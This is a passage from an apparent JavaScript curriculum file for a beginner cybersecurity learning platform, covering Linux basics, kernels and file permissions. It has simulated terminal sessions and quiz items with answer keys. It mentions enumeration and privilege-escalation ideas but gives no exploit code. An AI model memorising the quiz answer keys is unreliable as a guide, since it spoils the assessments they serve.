/**
 * Endlessus Learning Hub - Comprehensive Curriculum Database
 * 
 * Auto-compiled from modular curriculum sources.
 * Total Stages: 11
 * Total Core Rooms: 40
 * Total Practical Labs: 13
 * 
 * Designed for zero-knowledge beginners to Junior Penetration Testers.
 */

const ENDLESSUS_STAGES = [
  {
    "id": 0,
    "number": "00",
    "title": "Start Here",
    "tagline": "Welcome & Foundations",
    "description": "Zero experience required. Discover what cybersecurity is, how ethical hacking works, and run your very first terminal command.",
    "color": "#10b981",
    "roomCount": 1,
    "estimatedTime": "15 min",
    "difficulty": "Beginner"
  },
  {
    "id": 1,
    "number": "01",
    "title": "Computer Fundamentals",
    "tagline": "Hardware, OS & Linux",
    "description": "Understand the machine before defending or testing it: CPU, RAM, OS kernels, Linux filesystem hierarchy, permissions, and process management.",
    "color": "#06b6d4",
    "roomCount": 4,
    "estimatedTime": "1 hr 45 min",
    "difficulty": "Beginner"
  },
  {
    "id": 2,
    "number": "02",
    "title": "Networking Fundamentals",
    "tagline": "How Computers Communicate",
    "description": "The core backbone of cybersecurity: networks, IP & MAC addresses, ports, protocols, TCP 3-way handshakes, packets, DNS, and DHCP.",
    "color": "#3b82f6",
    "roomCount": 5,
    "estimatedTime": "2 hr 10 min",
    "difficulty": "Foundation"
  },
  {
    "id": 3,
    "number": "03",
    "title": "How the Web Works",
    "tagline": "Web Architecture, HTTP & Sessions",
    "description": "Follow the full journey of a web request: DNS to TLS, HTTP methods, headers, status codes, cookies, and stateful session management.",
    "color": "#6366f1",
    "roomCount": 3,
    "estimatedTime": "1 hr 20 min",
    "difficulty": "Foundation"
  },
  {
    "id": 4,
    "number": "04",
    "title": "Cybersecurity Fundamentals",
    "tagline": "Security Principles, CIA & Threats",
    "description": "The mental framework of security: assets, threats, vulnerabilities, the CIA triad, authentication vs authorization, threat types, and cryptography.",
    "color": "#8b5cf6",
    "roomCount": 5,
    "estimatedTime": "2 hr 05 min",
    "difficulty": "Foundation"
  },
  {
    "id": 5,
    "number": "05",
    "title": "Security Tools",
    "tagline": "Practitioner Toolset & Analysis",
    "description": "Master the essential utilities: Linux security tools, Nmap network scanning, Wireshark packet capture, and security log analysis.",
    "color": "#ec4899",
    "roomCount": 4,
    "estimatedTime": "2 hr 10 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 6,
    "number": "06",
    "title": "Web Security",
    "tagline": "OWASP Top Flaws & Defenses",
    "description": "Explore the most prevalent web application vulnerabilities: SQL Injection, XSS, IDOR, CSRF, authentication flaws, and security headers.",
    "color": "#f59e0b",
    "roomCount": 8,
    "estimatedTime": "4 hr 30 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 7,
    "number": "07",
    "title": "Linux Security",
    "tagline": "Privilege Escalation & SUID",
    "description": "Understand root privilege, SUID binaries, misconfigured sudoers, and how standard users identify escalation pathways.",
    "color": "#ef4444",
    "roomCount": 1,
    "estimatedTime": "40 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 8,
    "number": "08",
    "title": "Network Security",
    "tagline": "SMB & Network Services",
    "description": "Audit enterprise network file shares, identify null sessions, and extract sensitive information from exposed SMB services.",
    "color": "#14b8a6",
    "roomCount": 1,
    "estimatedTime": "35 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 9,
    "number": "09",
    "title": "Modern Security",
    "tagline": "Tokens, JWT & Cryptanalysis",
    "description": "Inspect modern stateless authentication tokens (JWTs), identify algorithm flaws, and practice classical cipher cryptanalysis.",
    "color": "#a855f7",
    "roomCount": 2,
    "estimatedTime": "1 hr 10 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 10,
    "number": "10",
    "title": "Junior Pentester",
    "tagline": "Methodology, Tooling & Capstone",
    "description": "Synthesize all knowledge into a professional pentest methodology: OSINT recon, web directory fuzzing, Burp Suite, advanced privesc, and a complete capstone engagement.",
    "color": "#e11d48",
    "roomCount": 6,
    "estimatedTime": "4 hr 05 min",
    "difficulty": "Advanced"
  }
];

const ENDLESSUS_ROOMS = [
  {
    "id": "room-01",
    "stage": 0,
    "stageTitle": "Stage 0 — Start Here",
    "title": "Welcome to Cybersecurity",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "15 min",
    "prerequisites": "None (Zero prior knowledge required)",
    "whyAreYouHere": "You have arrived at the start of your journey. Cybersecurity can feel intimidating with hundreds of confusing abbreviations, dark terminal windows, and complex tools. In this room, you will demystify what cybersecurity really is, understand how ethical hackers think, and execute your very first command in the Endlessus interactive terminal with zero fear.",
    "objectives": [
      "Understand what cybersecurity is and why it protects the modern digital world",
      "Differentiate between Offensive Security (Red Team) and Defensive Security (Blue Team)",
      "Learn what makes ethical hacking legal, authorized, and professional",
      "Understand Rules of Engagement (RoE) and Scope in security testing",
      "Run your first interactive shell command (`whoami`) and interpret the output",
      "Learn how to use progressive hints when you get stuck"
    ],
    "vocabulary": [
      {
        "term": "Cybersecurity",
        "definition": "The practice of protecting systems, networks, devices, and data from digital attacks, damage, or unauthorized access."
      },
      {
        "term": "Offensive Security (Red Team)",
        "definition": "Ethical hackers who simulate adversarial attacks to find security weaknesses before malicious actors do."
      },
      {
        "term": "Defensive Security (Blue Team)",
        "definition": "Security engineers and analysts who build defenses, monitor logs, detect intrusions, and respond to incidents."
      },
      {
        "term": "Ethical Hacker",
        "definition": "A security professional who hacks with explicit written permission to help organizations fix vulnerabilities."
      },
      {
        "term": "Scope",
        "definition": "The precise list of systems, domains, and IP addresses you are legally authorized to test."
      },
      {
        "term": "Command Shell / Terminal",
        "definition": "A text-based interface that lets you communicate directly with a computer by typing commands."
      }
    ],
    "lessons": [
      {
        "title": "1. What is Cybersecurity?",
        "content": "At its core, cybersecurity is about **trust**. Every day, hospitals manage patient vitals, banks process billions in wire transfers, and electrical grids supply power to millions. All of these run on computers connected together.\n\nWhen these systems have flaws, malicious hackers (often called \"black hats\") can steal private records, disrupt power, or hold businesses for ransom. Cybersecurity professionals exist to identify and fix these flaws first."
      },
      {
        "title": "2. Red Team vs Blue Team: Two Sides of the Shield",
        "content": "Cybersecurity is broadly divided into two cooperative sides:\n\n• **Offensive Security (Red Team)**: You think like an adversary. You test systems, search for configuration mistakes, verify whether software bugs can be exploited, and report your findings.\n• **Defensive Security (Blue Team)**: You design secure architectures, monitor network traffic, set up firewalls, investigate suspicious activity, and patch vulnerabilities.\n\nBoth teams need the exact same foundational knowledge: **you cannot defend or test what you do not understand**."
      },
      {
        "title": "3. The Law: Authorization & Scope",
        "content": "What separates an ethical hacker from a cybercriminal is not technical skill — it is **authorization**.\n\nTesting or probing a system without explicit, written permission from the owner is illegal under computer misuse legislation worldwide. In Endlessus, every lab target is run in a secure, sandboxed environment specifically created for your education. You have full authorization here!"
      }
    ],
    "seeExamples": [
      {
        "title": "Interactive Shell: How Commands Work",
        "codeOrDiagram": "cadet@endlessus:~$ whoami\ncadet\n\ncadet@endlessus:~$ date\nSun Oct 05 16:30:00 UTC 2026\n\ncadet@endlessus:~$ echo \"Hello, Cybersecurity!\"\nHello, Cybersecurity!",
        "explanation": "In a terminal, you type a command next to the prompt (`$`), press Enter, and the operating system responds with text output. Here, `whoami` asks the computer: 'What is my current username?'"
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Type `whoami` below and press Enter to see your current identity in the Endlessus sandbox:",
      "initialCommand": "",
      "expectedCommand": "whoami",
      "simulatedOutput": "cadet\n[+] Success! Your terminal identity is 'cadet'. You just executed your first shell command.",
      "explanation": "The command `whoami` is one of the simplest utilities in Unix/Linux. It tells you your active user account name."
    },
    "questions": [
      {
        "id": "r1-q1",
        "type": "multiple-choice",
        "question": "What is the single most critical factor that distinguishes an ethical penetration tester from an unauthorized attacker?",
        "options": [
          "Ethical hackers only use open-source operating systems",
          "Ethical hackers have explicit written authorization and an agreed scope from the system owner",
          "Ethical hackers never look at application source code",
          "Ethical hackers only test web browsers and never networks"
        ],
        "correctIndex": 1,
        "explanation": "Authorization is paramount. Without explicit, written permission and clear scope, testing any computer system is illegal."
      },
      {
        "id": "r1-q2",
        "type": "multiple-choice",
        "question": "A company hires you to simulate an attack against their customer portal to find vulnerabilities before launch. Which security role are you performing?",
        "options": [
          "Defensive Security (Blue Team)",
          "Offensive Security (Red Team)",
          "Hardware Technician",
          "Database Administrator"
        ],
        "correctIndex": 1,
        "explanation": "Simulating attacks to discover vulnerabilities is the definition of offensive security (Red Teaming / penetration testing)."
      },
      {
        "id": "r1-q3",
        "type": "command-interpretation",
        "question": "What does the command `whoami` return when run in a Linux or Windows terminal?",
        "options": [
          "The current IP address of your network card",
          "The list of installed programs on the computer",
          "The username of the account currently running the shell",
          "The version of the Linux kernel"
        ],
        "correctIndex": 2,
        "explanation": "`whoami` prints the effective user ID (username) of the current shell session."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute your first shell command",
        "instruction": "Use the interactive terminal below to query your active session user by typing `whoami`.",
        "hints": [
          "Concept: You are querying your session's user identity.",
          "Direction: Type into the terminal input box directly.",
          "Tool: Use the standard POSIX username utility.",
          "Syntax: `whoami` (all lowercase, no spaces).",
          "Explanation: Typing `whoami` will output 'cadet', proving your terminal works."
        ]
      }
    ],
    "explainResult": "You typed `whoami`. The operating system searched its system path (`/usr/bin/whoami`), ran the program, read the user ID associated with your session process (UID 1001: cadet), printed it to standard output, and closed the process.",
    "securityConnection": "Whenever a penetration tester gains access to an unknown server or terminal, the first command they run is almost always `whoami` or `id`. It instantly tells them whether they landed as an unprivileged user (requiring privilege escalation) or as the supreme administrator (root / SYSTEM).",
    "completion": {
      "learned": [
        "The purpose and societal value of cybersecurity",
        "The division of labor between Red and Blue teams",
        "The vital legal boundary of authorization and scope",
        "How a shell prompt works and interprets commands"
      ],
      "practiced": [
        "whoami",
        "Interactive terminal command execution",
        "Using the 5-stage hint system"
      ]
    },
    "nextRoomId": "room-02"
  },
  {
    "id": "room-02",
    "stage": 1,
    "stageTitle": "Stage 1 — Computer Fundamentals",
    "title": "How Computers Work",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "20 min",
    "prerequisites": "Room 01 (Welcome to Cybersecurity)",
    "whyAreYouHere": "You cannot secure or attack a computer if you don't know what happens inside the box. Before looking at exploits, you need to understand the physical and logical components: how binary data travels through the motherboard, how the CPU executes machine instructions, and why RAM is fundamentally different from hard drive storage.",
    "objectives": [
      "Understand the primary hardware components: CPU, RAM, Storage, and Motherboard",
      "Learn how binary (0s and 1s) represents text, numbers, and machine instructions",
      "Differentiate between volatile memory (RAM) and non-volatile persistence (SSD/HDD)",
      "Understand what happens when a program is loaded from disk into memory to become a process"
    ],
    "vocabulary": [
      {
        "term": "CPU (Central Processing Unit)",
        "definition": "The brain of the computer that fetches, decodes, and executes program instructions billions of times per second."
      },
      {
        "term": "RAM (Random Access Memory)",
        "definition": "Fast, temporary (volatile) workspace memory where active programs and data live while the computer is turned on."
      },
      {
        "term": "Storage (SSD/HDD)",
        "definition": "Persistent (non-volatile) storage that retains your files, operating system, and programs even when powered off."
      },
      {
        "term": "Binary",
        "definition": "The base-2 numbering system consisting only of 0s and 1s that digital circuits use to represent all information."
      },
      {
        "term": "Program",
        "definition": "A static collection of compiled instructions stored on disk waiting to be run."
      },
      {
        "term": "Process",
        "definition": "An actively executing instance of a program loaded into RAM with its own allocated memory space."
      }
    ],
    "lessons": [
      {
        "title": "1. The Core Architecture",
        "content": "Every computing device — from a smart thermostat to a cloud server — relies on four primary components:\n• **CPU (The Brain)**: Executes machine instructions in arithmetic, logic, and control loops.\n• **RAM (The Desk)**: Fast working memory. When you open an app, its code and working variables are copied from your drive into RAM so the CPU can read them in nanoseconds. When power turns off, RAM is wiped clean!\n• **Storage (The Filing Cabinet)**: Your NVMe SSD or hard drive. It is slower than RAM but remembers data permanently.\n• **Motherboard (The Nervous System)**: The printed circuit board with high-speed buses connecting CPU, RAM, and storage together."
      },
      {
        "title": "2. From File on Disk to Active Process",
        "content": "When you run a program like `nmap`:\n1. **Disk**: The operating system reads the program binary file from storage.\n2. **RAM Allocation**: The OS allocates a block of RAM for code, global variables, stack, and heap.\n3. **CPU Execution**: The CPU's Instruction Pointer points to the program entry point and begins executing assembly instructions one by one."
      }
    ],
    "seeExamples": [
      {
        "title": "Lifecycle of a Running Program",
        "codeOrDiagram": "[ Storage: /bin/ls (Static File on SSD) ]\n                 ↓ Loaded into RAM\n[ RAM: Process PID #4092 (Virtual Memory Space) ]\n                 ↓\n[ CPU: Fetches opcodes -> Executes instructions -> Prints output ]",
        "explanation": "A file on storage becomes an active process once it is mapped into RAM and scheduled onto the CPU."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Check the current memory status of our lab system using the standard Linux command `free -m`:",
      "initialCommand": "",
      "expectedCommand": "free -m",
      "simulatedOutput": "               total        used        free      shared  buff/cache   available\nMem:            7924        1840        4210         124        1874        5710\nSwap:           2048           0        2048\n[+] Success! You inspected system RAM. Total: 7924MB (~8GB), Free: 4210MB (~4.2GB).",
      "explanation": "`free -m` displays memory usage in Megabytes (MB). This lets security analysts detect memory exhaustion or stealthy malware consuming RAM."
    },
    "questions": [
      {
        "id": "r2-q1",
        "type": "multiple-choice",
        "question": "When a computer loses electrical power abruptly, which component immediately loses all of its stored data?",
        "options": [
          "NVMe Solid State Drive (SSD)",
          "Random Access Memory (RAM)",
          "Magnetic Hard Disk Drive (HDD)",
          "Motherboard BIOS / UEFI Flash Chip"
        ],
        "correctIndex": 1,
        "explanation": "RAM is volatile memory. Without electrical charge, dynamic RAM capacitors quickly discharge, clearing all active data."
      },
      {
        "id": "r2-q2",
        "type": "multiple-choice",
        "question": "What is the technical term for a program that has been loaded into memory and is currently being executed by the CPU?",
        "options": [
          "A Script",
          "A Process",
          "A Package",
          "A Driver"
        ],
        "correctIndex": 1,
        "explanation": "A static file on disk is a program; once loaded into RAM and scheduled for CPU execution, it is an active process with a Process ID (PID)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Inspect System Memory",
        "instruction": "Run `free -m` in the terminal to inspect available RAM on the lab machine.",
        "hints": [
          "Concept: Memory utilization command.",
          "Direction: Use the Linux command for free memory.",
          "Tool: `free` command.",
          "Syntax: `free -m` (displays values in megabytes).",
          "Explanation: Output reveals total, used, and free memory."
        ]
      }
    ],
    "explainResult": "The `free -m` command queried the Linux virtual kernel file `/proc/meminfo`, parsed the current physical memory pages, and presented the data in easy-to-read megabytes.",
    "securityConnection": "In digital forensics and incident response, RAM holds unencrypted passwords, decrypted cryptographic keys, and running malware artifacts that may never touch the hard disk! Forensic examiners perform 'RAM acquisition' before powering down a compromised server.",
    "completion": {
      "learned": [
        "Hardware hierarchy: CPU, RAM, Storage, and Motherboard",
        "The difference between volatile memory and non-volatile storage",
        "How binary represents instructions and data",
        "The distinction between a static program file and an active process"
      ],
      "practiced": [
        "free -m",
        "Interpreting memory tables",
        "Identifying volatile artifacts"
      ]
    },
    "nextRoomId": "room-03"
  },
  {
    "id": "room-03",
    "stage": 1,
    "stageTitle": "Stage 1 — Computer Fundamentals",
    "title": "Operating Systems & The Kernel",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "25 min",
    "prerequisites": "Room 02 (How Computers Work)",
    "whyAreYouHere": "Applications cannot talk directly to raw silicon; doing so would allow any program to corrupt other programs or damage hardware. The Operating System (OS) is the master coordinator. In this room, you will learn how the kernel protects hardware, what system calls are, and why Linux powers the vast majority of cybersecurity infrastructure and cloud servers.",
    "objectives": [
      "Understand what an Operating System does",
      "Learn the difference between Kernel Space and User Space",
      "Understand how applications make System Calls (syscalls) to request privileged actions",
      "Compare Windows architecture with Linux architecture",
      "Inspect the running kernel version on your system"
    ],
    "vocabulary": [
      {
        "term": "Kernel",
        "definition": "The core program of the operating system that runs with supreme hardware privilege (Ring 0) and controls CPU, memory, and devices."
      },
      {
        "term": "User Space",
        "definition": "The restricted memory space (Ring 3) where regular user programs and applications run without direct hardware access."
      },
      {
        "term": "System Call (syscall)",
        "definition": "The controlled bridge an application uses to ask the kernel to perform a privileged action (like reading a file or sending a packet)."
      },
      {
        "term": "Device Driver",
        "definition": "A specialized kernel module that translates generic OS commands into hardware-specific signals for a particular device."
      },
      {
        "term": "POSIX",
        "definition": "A family of standards maintaining compatibility between Unix-like operating systems (including Linux, macOS, and BSD)."
      }
    ],
    "lessons": [
      {
        "title": "1. Kernel Space vs User Space",
        "content": "Modern CPUs enforce hardware privilege rings:\n• **Ring 0 (Kernel Space)**: Has direct, unrestricted access to all CPU instructions and physical memory. If code here crashes, the entire computer suffers a Blue Screen or Kernel Panic.\n• **Ring 3 (User Space)**: Where your web browser, text editor, or game runs. If a program here crashes, only that single process terminates; the rest of the OS keeps running safely."
      },
      {
        "title": "2. How System Calls Protect the Machine",
        "content": "When an app in User Space wants to read a file from the hard drive:\n1. It cannot directly pulse the SSD controller.\n2. It executes a **System Call** (such as `sys_read` in Linux).\n3. The CPU transitions into Kernel Mode.\n4. The kernel checks permissions: *Does this user have permission to open this file?*\n5. If allowed, the kernel fetches the bytes and copies them back to the user app."
      }
    ],
    "seeExamples": [
      {
        "title": "System Call Bridge Diagram",
        "codeOrDiagram": "[ User Space (Ring 3) ]   User Application (e.g. cat secret.txt)\n                                  ↓ syscall: open() & read()\n====================== [ Protection Boundary ] ======================\n[ Kernel Space (Ring 0) ] Linux Kernel checks permissions -> Reads Disk Controller",
        "explanation": "The OS boundary guarantees that malicious or broken programs cannot bypass filesystem permissions or access memory belonging to other users."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Find out which operating system and kernel version is running in your lab terminal using `uname -a`:",
      "initialCommand": "",
      "expectedCommand": "uname -a",
      "simulatedOutput": "Linux endlessus-box 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux\n[+] Success! System identified: Linux 6.8.0 on x86_64 architecture.",
      "explanation": "`uname -a` (Unix Name, all information) tells you the kernel name, hostname, kernel release version, architecture, and OS family."
    },
    "questions": [
      {
        "id": "r3-q1",
        "type": "multiple-choice",
        "question": "Why do modern operating systems strictly separate Kernel Space from User Space?",
        "options": [
          "To allow web browsers to access physical memory directly for speed",
          "To prevent unprivileged user programs from crashing the entire system or bypassing security checks",
          "To eliminate the need for computer processors",
          "To make installing applications require physical USB keys"
        ],
        "correctIndex": 1,
        "explanation": "By isolating user programs from Ring 0, the OS ensures a bug or exploit in a user program cannot compromise the whole system without a kernel privilege escalation."
      },
      {
        "id": "r3-q2",
        "type": "multiple-choice",
        "question": "When a user program needs to open a file or send data over the network, what mechanism does it use to request the kernel's assistance?",
        "options": [
          "A System Call (syscall)",
          "A DNS query",
          "A BIOS flash",
          "An HTTP cookie"
        ],
        "correctIndex": 0,
        "explanation": "Applications use system calls (such as open, read, write, socket) to invoke privileged kernel services."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Query the Kernel Version",
        "instruction": "Execute `uname -a` in the terminal to inspect the underlying kernel architecture.",
        "hints": [
          "Concept: Command to print system information.",
          "Direction: Use `uname` with a flag.",
          "Tool: `uname` utility.",
          "Syntax: `uname -a` (the `-a` stands for 'all').",
          "Explanation: Output will show Linux kernel 6.8."
        ]
      }
    ],
    "explainResult": "The `uname -a` utility executed the `uname()` system call, which retrieved the `utsname` structure directly from the active Linux kernel.",
    "securityConnection": "Kernel version enumeration is a core step in vulnerability assessments. Outdated kernels often contain known privilege escalation vulnerabilities (like Dirty COW or Dirty Pipe) that allow a standard user to become root instantly.",
    "completion": {
      "learned": [
        "The purpose and responsibilities of the operating system",
        "Kernel Space (Ring 0) vs User Space (Ring 3)",
        "How system calls enforce security boundaries",
        "How to query operating system and kernel build details"
      ],
      "practiced": [
        "uname -a",
        "Identifying kernel architecture",
        "Analyzing OS privilege levels"
      ]
    },
    "nextRoomId": "room-04"
  },
  {
    "id": "room-04",
    "stage": 1,
    "stageTitle": "Stage 1 — Computer Fundamentals",
    "title": "Linux Fundamentals & Navigation",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "30 min",
    "prerequisites": "Room 03 (Operating Systems)",
    "whyAreYouHere": "Linux is the lingua franca of cybersecurity. Over 90% of the world's cloud servers, security tools (Nmap, Metasploit, Burp Suite), and testing platforms run on Linux. If you want to be a cybersecurity professional, navigating the Linux filesystem from a terminal must become second nature.",
    "objectives": [
      "Understand the difference between a Terminal emulator and a Shell (Bash/Zsh)",
      "Master the Linux single-root filesystem hierarchy (`/`)",
      "Understand critical system directories: `/etc`, `/home`, `/var`, `/tmp`, and `/bin`",
      "Distinguish between Absolute Paths (`/home/cadet/file`) and Relative Paths (`./file`)",
      "Confidently use navigation commands: `pwd`, `ls`, `cd`, `cat`, `mkdir`, `cp`, `mv`, and `rm`"
    ],
    "vocabulary": [
      {
        "term": "Root Directory (`/`)",
        "definition": "The top-most directory in the Linux hierarchy from which all other folders and mounted drives branch."
      },
      {
        "term": "Absolute Path",
        "definition": "A file path starting from the root directory (`/`), completely specifying location regardless of current working directory."
      },
      {
        "term": "Relative Path",
        "definition": "A path specified relative to where you currently are in the directory tree (e.g. `./notes.txt` or `../folder`)."
      },
      {
        "term": "`/etc`",
        "definition": "The system directory storing machine-wide configuration files (e.g. `/etc/passwd`)."
      },
      {
        "term": "`/var/log`",
        "definition": "The directory where system services write diagnostic and security event logs."
      },
      {
        "term": "`/tmp`",
        "definition": "A world-writable temporary directory wiped on reboot, often used by testers to stage scripts."
      }
    ],
    "lessons": [
      {
        "title": "1. The Inverted Tree Filesystem",
        "content": "Unlike Windows with drive letters like `C:\\` or `D:\\`, Linux organizes everything under a single unified root slash: `/`.\n• `/bin` & `/usr/bin`: Essential executable commands (ls, cat, ping).\n• `/etc`: Configuration files for the OS and services.\n• `/home`: Personal user folders (e.g., `/home/cadet`).\n• `/var`: Variable data such as web roots (`/var/www/html`) and logs (`/var/log`).\n• `/tmp`: Temporary files accessible by all users."
      },
      {
        "title": "2. Essential Command Vocabulary",
        "content": "• `pwd`: *Print Working Directory* — tells you where you are standing right now.\n• `ls -la`: *List files* — shows all files including hidden ones (starting with a dot `.`) with permissions and sizes.\n• `cd <dir>`: *Change Directory* — moves your location. `cd ..` moves one level up; `cd ~` goes to your home folder.\n• `cat <file>`: *Concatenate* — prints the entire contents of a file to your terminal screen."
      }
    ],
    "seeExamples": [
      {
        "title": "Absolute vs Relative Navigation",
        "codeOrDiagram": "cadet@endlessus:~$ pwd\n/home/cadet\n\ncadet@endlessus:~$ cd /etc/ssh     <-- Absolute path (starts with /)\ncadet@endlessus:/etc/ssh$ pwd\n/etc/ssh\n\ncadet@endlessus:/etc/ssh$ cd ..    <-- Relative path (moves up one level)\ncadet@endlessus:/etc$ pwd\n/etc",
        "explanation": "Absolute paths work identically no matter where you are. Relative paths change meaning depending on your current working folder."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Print your current directory using `pwd`, then list all files in your home folder with `ls -la`:",
      "initialCommand": "",
      "expectedCommand": "ls -la",
      "simulatedOutput": "total 28\ndrwxr-xr-x 4 cadet cadet 4096 Oct  5 16:30 .\ndrwxr-xr-x 3 root  root  4096 Oct  1 00:00 ..\n-rw-r--r-- 1 cadet cadet  220 Oct  5 16:30 .bash_logout\n-rw-r--r-- 1 cadet cadet 3771 Oct  5 16:30 .bashrc\n-rw-r--r-- 1 cadet cadet  807 Oct  5 16:30 .profile\ndrwxr-xr-x 2 cadet cadet 4096 Oct  5 16:30 mission_briefings\n-rw-r--r-- 1 cadet cadet   64 Oct  5 16:30 welcome.txt\n[+] Success! You listed directory contents including hidden dotfiles.",
      "explanation": "Notice the files starting with `.` (like `.bashrc`). These are hidden configuration files in Linux."
    },
    "questions": [
      {
        "id": "r4-q1",
        "type": "multiple-choice",
        "question": "Which directory in a Linux system contains system-wide configuration files (such as network settings, installed service configs, and user databases)?",
        "options": [
          "/tmp",
          "/bin",
          "/etc",
          "/dev"
        ],
        "correctIndex": 2,
        "explanation": "`/etc` (traditionally 'et cetera' or 'editable text configuration') contains host-specific configuration files."
      },
      {
        "id": "r4-q2",
        "type": "multiple-choice",
        "question": "What does the special relative directory symbol `..` represent in Linux and Unix terminal navigation?",
        "options": [
          "The user's home directory",
          "The parent directory (one level up in the hierarchy)",
          "The root directory `/`",
          "The current working directory"
        ],
        "correctIndex": 1,
        "explanation": "`..` points to the parent directory one level above your current location. A single dot `.` refers to the current directory."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Read a File",
        "instruction": "Use `cat welcome.txt` in the terminal to view the contents of the introductory text file.",
        "hints": [
          "Concept: Read a text file to standard output.",
          "Direction: Use the concatenate utility.",
          "Tool: `cat`",
          "Syntax: `cat welcome.txt`",
          "Explanation: `cat` reads the file and outputs its text lines."
        ]
      }
    ],
    "explainResult": "The `cat` command opened `welcome.txt`, read its byte stream, and streamed it directly to standard output (STDOUT), displaying the text on your screen.",
    "securityConnection": "Linux directory knowledge is critical in reconnaissance and exploitation. Security analysts frequently read `/etc/passwd` to enumerate system users, `/var/log/auth.log` to track brute-force attacks, and `/tmp` to stage penetration testing tools.",
    "completion": {
      "learned": [
        "The single-root Linux filesystem hierarchy",
        "The roles of `/etc`, `/var`, `/tmp`, and `/bin`",
        "The difference between absolute and relative paths",
        "Foundational commands: pwd, ls -la, cd, cat"
      ],
      "practiced": [
        "pwd",
        "ls -la",
        "cat welcome.txt",
        "Reading directory listings"
      ]
    },
    "nextRoomId": "room-05"
  },
  {
    "id": "room-05",
    "stage": 1,
    "stageTitle": "Stage 1 — Computer Fundamentals",
    "title": "Linux Users, Permissions & Processes",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 04 (Linux Fundamentals)",
    "whyAreYouHere": "Linux is a multi-user operating system built around strict permissions. If every user could read every file, security would not exist. Understanding users, groups, read/write/execute permissions, and process management is the absolute foundation required for both system hardening and later Linux privilege escalation.",
    "objectives": [
      "Understand User IDs (UIDs), Group IDs (GIDs), and the supreme `root` account",
      "Decode Linux permission strings (e.g., `-rwxr-xr--`)",
      "Learn octal permission values (Read = 4, Write = 2, Execute = 1)",
      "Modify permissions and ownership using `chmod` and `chown`",
      "Inspect and manage running processes using `ps aux` and `kill`"
    ],
    "vocabulary": [
      {
        "term": "root",
        "definition": "The superuser account (UID 0) with unrestricted power to read/write/delete any file and execute any command on the system."
      },
      {
        "term": "Permissions (rwx)",
        "definition": "Access flags: Read (r=4), Write (w=2), and Execute (x=1) assigned to User (owner), Group, and Others."
      },
      {
        "term": "chmod",
        "definition": "The 'change mode' utility used to adjust read, write, and execute permissions on files and directories."
      },
      {
        "term": "chown",
        "definition": "The 'change owner' utility used to assign file ownership to another user or group."
      },
      {
        "term": "PID (Process ID)",
        "definition": "A unique numerical identifier assigned by the Linux kernel to every active running process."
      }
    ],
    "lessons": [
      {
        "title": "1. The Anatomy of a Permission String",
        "content": "When you run `ls -l`, each file begins with a 10-character string:\n`- rwx r-x r--`\n• 1st char: File type (`-` for regular file, `d` for directory).\n• Chars 2-4: **Owner (User)** permissions (`rwx` = read, write, execute).\n• Chars 5-7: **Group** permissions (`r-x` = read and execute, no write).\n• Chars 8-10: **Others (Everyone else)** permissions (`r--` = read-only)."
      },
      {
        "title": "2. The Octal Numbering System",
        "content": "Permissions are calculated using simple math:\n• **Read (r)** = 4\n• **Write (w)** = 2\n• **Execute (x)** = 1\nAdd the numbers together for each triplet:\n• `rwx` = 4 + 2 + 1 = **7**\n• `r-x` = 4 + 0 + 1 = **5**\n• `r--` = 4 + 0 + 0 = **4**\nTherefore, `chmod 754 script.sh` gives Owner full control (7), Group read+execute (5), and Others read-only (4)."
      }
    ],
    "seeExamples": [
      {
        "title": "Permission Calculation Table",
        "codeOrDiagram": "Binary   Octal   Symbolic   Meaning\n  111      7       rwx      Read, Write, and Execute\n  110      6       rw-      Read and Write\n  101      5       r-x      Read and Execute\n  100      4       r--      Read only\n  000      0       ---      No permissions",
        "explanation": "Whenever you see `chmod 777`, it means everyone on the system can read, alter, or run that file — a massive security risk!"
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Inspect the permissions of a confidential report using `ls -l confidential.txt`, then restrict it so only the owner can read and write (`chmod 600 confidential.txt`):",
      "initialCommand": "",
      "expectedCommand": "chmod 600 confidential.txt",
      "simulatedOutput": "-rw------- 1 cadet cadet 512 Oct  5 16:32 confidential.txt\n[+] Success! File restricted to owner only (Read + Write). Group and Others have zero access.",
      "explanation": "Octal `600` means: Owner: 4+2=6 (rw-), Group: 0 (---), Others: 0 (---). Confidential files should always be protected this way."
    },
    "questions": [
      {
        "id": "r5-q1",
        "type": "multiple-choice",
        "question": "What numerical value corresponds to `chmod 755 filename`?",
        "options": [
          "Owner: rwx, Group: r-x, Others: r-x",
          "Owner: rw-, Group: r--, Others: r--",
          "Owner: rwx, Group: rwx, Others: rwx",
          "Owner: ---, Group: rwx, Others: r-x"
        ],
        "correctIndex": 0,
        "explanation": "7 = 4+2+1 (rwx), 5 = 4+0+1 (r-x), 5 = 4+0+1 (r-x). This is the standard permission for public executables and scripts."
      },
      {
        "id": "r5-q2",
        "type": "multiple-choice",
        "question": "What is the User ID (UID) of the `root` superuser on standard Linux systems?",
        "options": [
          "UID 1000",
          "UID 1",
          "UID 0",
          "UID 999"
        ],
        "correctIndex": 2,
        "explanation": "UID 0 is hardcoded in the Unix/Linux kernel as the superuser `root`."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Fix Overly Permissive File",
        "instruction": "Use `chmod 600 confidential.txt` to remove world permissions from the secret file.",
        "hints": [
          "Concept: Use octal permissions to lock down access.",
          "Direction: 6 for user, 0 for group, 0 for others.",
